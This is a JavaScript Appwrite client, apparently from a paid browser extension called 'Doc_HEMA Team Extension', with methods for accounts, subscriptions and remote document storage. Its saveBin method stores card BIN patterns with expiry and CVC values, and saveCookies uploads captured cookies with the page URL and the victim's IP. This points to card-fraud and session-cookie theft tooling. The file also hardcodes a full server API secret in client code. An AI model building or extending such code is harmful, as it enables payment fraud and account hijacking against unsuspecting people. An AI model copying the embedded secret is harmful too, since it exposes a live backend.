// Appwrite Configuration for Doc_HEMA Team Extension
// ===================================================

const APPWRITE_CONFIG = {
    endpoint: 'https://nyc.cloud.appwrite.io/v1',
    projectId: '693631c8001ac4fbc231',
    databaseId: '69363201001bc7a64088',
    apiSecret: 'standard_917cef86aef581038cb102a0b6d645aa4574cdccefe56659604f22954dba8b1213ac7a0172d73857e904188fba17e8574f23cfb1f4393301aae31c20b8213b086293b0f8c0f3a581e0862ef5db10ad03b749561368f61778ddf118941af5137eeae8ffc196cdb3f3b8a4ac489dd99a67a059fdfc00afad2893b8858a9ca904e3',

    // Collection IDs (will be created)
    collections: {
        users: 'users',
        subscriptions: 'subscriptions',
        bins: 'bins',
        cookies: 'cookies',
        logs: 'logs'
    }
};

// Appwrite API Helper Functions
// ==============================

class AppwriteClient {
    constructor() {
        this.endpoint = APPWRITE_CONFIG.endpoint;
        this.projectId = APPWRITE_CONFIG.projectId;
        this.databaseId = APPWRITE_CONFIG.databaseId;
        this.apiSecret = APPWRITE_CONFIG.apiSecret;
    }

    // Get headers for API requests
    getHeaders(sessionToken = null) {
        const headers = {
            'Content-Type': 'application/json',
            'X-Appwrite-Project': this.projectId,
        };

        if (sessionToken) {
            headers['X-Appwrite-Session'] = sessionToken;
        } else {
            headers['X-Appwrite-Key'] = this.apiSecret;
        }

        return headers;
    }

    // Generate unique ID
    generateId() {
        return 'unique()';
    }

    // =====================
    // Authentication Methods
    // =====================

    // Create account
    async createAccount(email, password, name) {
        try {
            const response = await fetch(`${this.endpoint}/account`, {
                method: 'POST',
                headers: this.getHeaders(),
                body: JSON.stringify({
                    userId: this.generateId(),
                    email: email,
                    password: password,
                    name: name
                })
            });

            if (!response.ok) {
                const error = await response.json();
                throw new Error(error.message || 'Failed to create account');
            }

            return await response.json();
        } catch (error) {
            console.error('Create account error:', error);
            throw error;
        }
    }

    // Create email session (login)
    async createSession(email, password) {
        try {
            const response = await fetch(`${this.endpoint}/account/sessions/email`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Appwrite-Project': this.projectId
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });

            if (!response.ok) {
                const error = await response.json();
                throw new Error(error.message || 'فشل تسجيل الدخول');
            }

            return await response.json();
        } catch (error) {
            console.error('Create session error:', error);
            throw error;
        }
    }

    // Get current session
    async getSession(sessionId) {
        try {
            const response = await fetch(`${this.endpoint}/account/sessions/${sessionId}`, {
                method: 'GET',
                headers: this.getHeaders()
            });

            return response.ok ? await response.json() : null;
        } catch (error) {
            console.error('Get session error:', error);
            return null;
        }
    }

    // Delete session (logout)
    async deleteSession(sessionId) {
        try {
            const response = await fetch(`${this.endpoint}/account/sessions/${sessionId}`, {
                method: 'DELETE',
                headers: this.getHeaders()
            });

            return response.ok;
        } catch (error) {
            console.error('Delete session error:', error);
            return false;
        }
    }

    // =====================
    // Database Methods
    // =====================

    // Create document
    async createDocument(collectionId, data, documentId = null) {
        try {
            const response = await fetch(
                `${this.endpoint}/databases/${this.databaseId}/collections/${collectionId}/documents`,
                {
                    method: 'POST',
                    headers: this.getHeaders(),
                    body: JSON.stringify({
                        documentId: documentId || this.generateId(),
                        data: data
                    })
                }
            );

            if (!response.ok) {
                const error = await response.json();
                throw new Error(error.message || 'Failed to create document');
            }

            return await response.json();
        } catch (error) {
            console.error('Create document error:', error);
            throw error;
        }
    }

    // Get document by ID
    async getDocument(collectionId, documentId) {
        try {
            const response = await fetch(
                `${this.endpoint}/databases/${this.databaseId}/collections/${collectionId}/documents/${documentId}`,
                {
                    method: 'GET',
                    headers: this.getHeaders()
                }
            );

            return response.ok ? await response.json() : null;
        } catch (error) {
            console.error('Get document error:', error);
            return null;
        }
    }

    // List documents with optional queries
    async listDocuments(collectionId, queries = []) {
        try {
            let url = `${this.endpoint}/databases/${this.databaseId}/collections/${collectionId}/documents`;

            if (queries.length > 0) {
                const queryParams = queries.map(q => `queries[]=${encodeURIComponent(q)}`).join('&');
                url += `?${queryParams}`;
            }

            const response = await fetch(url, {
                method: 'GET',
                headers: this.getHeaders()
            });

            if (!response.ok) {
                const error = await response.json();
                throw new Error(error.message || 'Failed to list documents');
            }

            return await response.json();
        } catch (error) {
            console.error('List documents error:', error);
            throw error;
        }
    }

    // Update document
    async updateDocument(collectionId, documentId, data) {
        try {
            const response = await fetch(
                `${this.endpoint}/databases/${this.databaseId}/collections/${collectionId}/documents/${documentId}`,
                {
                    method: 'PATCH',
                    headers: this.getHeaders(),
                    body: JSON.stringify({
                        data: data
                    })
                }
            );

            if (!response.ok) {
                const error = await response.json();
                throw new Error(error.message || 'Failed to update document');
            }

            return await response.json();
        } catch (error) {
            console.error('Update document error:', error);
            throw error;
        }
    }

    // Delete document
    async deleteDocument(collectionId, documentId) {
        try {
            const response = await fetch(
                `${this.endpoint}/databases/${this.databaseId}/collections/${collectionId}/documents/${documentId}`,
                {
                    method: 'DELETE',
                    headers: this.getHeaders()
                }
            );

            return response.ok;
        } catch (error) {
            console.error('Delete document error:', error);
            return false;
        }
    }

    // =====================
    // User-specific Methods
    // =====================

    // Get user by userId
    async getUserByUserId(userId) {
        try {
            const result = await this.listDocuments(
                APPWRITE_CONFIG.collections.users,
                [`equal("userId", "${userId}")`]
            );
            return result.documents.length > 0 ? result.documents[0] : null;
        } catch (error) {
            console.error('Get user error:', error);
            return null;
        }
    }

    // Get user subscription
    async getUserSubscription(userId) {
        try {
            const result = await this.listDocuments(
                APPWRITE_CONFIG.collections.subscriptions,
                [`equal("userId", "${userId}")`]
            );
            return result.documents.length > 0 ? result.documents[0] : null;
        } catch (error) {
            console.error('Get subscription error:', error);
            return null;
        }
    }

    // Check if subscription is active
    async isSubscriptionActive(userId) {
        try {
            const subscription = await this.getUserSubscription(userId);
            if (!subscription) return false;

            if (!subscription.isActive) return false;

            const expiryDate = new Date(subscription.expiryDate);
            return expiryDate > new Date();
        } catch (error) {
            console.error('Check subscription error:', error);
            return false;
        }
    }

    // Get user BINs
    async getUserBins(userId) {
        try {
            const result = await this.listDocuments(
                APPWRITE_CONFIG.collections.bins,
                [`equal("userId", "${userId}")`]
            );
            return result.documents;
        } catch (error) {
            console.error('Get user BINs error:', error);
            return [];
        }
    }

    // Save BIN
    async saveBin(userId, binData) {
        try {
            const data = {
                userId: userId,
                pattern: binData.pattern,
                name: binData.name || `BIN ${binData.pattern}`,
                expiry: binData.expiry || null,
                cvc: binData.cvc || null,
                createdAt: new Date().toISOString()
            };

            return await this.createDocument(APPWRITE_CONFIG.collections.bins, data);
        } catch (error) {
            console.error('Save BIN error:', error);
            throw error;
        }
    }

    // Save cookies
    async saveCookies(userId, cookiesData) {
        try {
            const data = {
                userId: userId,
                cookies: cookiesData.cookies,
                url: cookiesData.url || '',
                ip: cookiesData.ip || 'unknown',
                capturedAt: new Date().toISOString()
            };

            return await this.createDocument(APPWRITE_CONFIG.collections.cookies, data);
        } catch (error) {
            console.error('Save cookies error:', error);
            throw error;
        }
    }

    // Save log entry
    async saveLog(userId, type, data) {
        try {
            const logData = {
                userId: userId,
                type: type,
                data: typeof data === 'string' ? data : JSON.stringify(data),
                ip: await this.getPublicIP(),
                createdAt: new Date().toISOString()
            };

            return await this.createDocument(APPWRITE_CONFIG.collections.logs, logData);
        } catch (error) {
            console.error('Save log error:', error);
            // Don't throw - logging should not break the app
        }
    }

    // Get public IP
    async getPublicIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (e) {
            return 'unknown';
        }
    }
}

// Create global instance
const appwrite = new AppwriteClient();
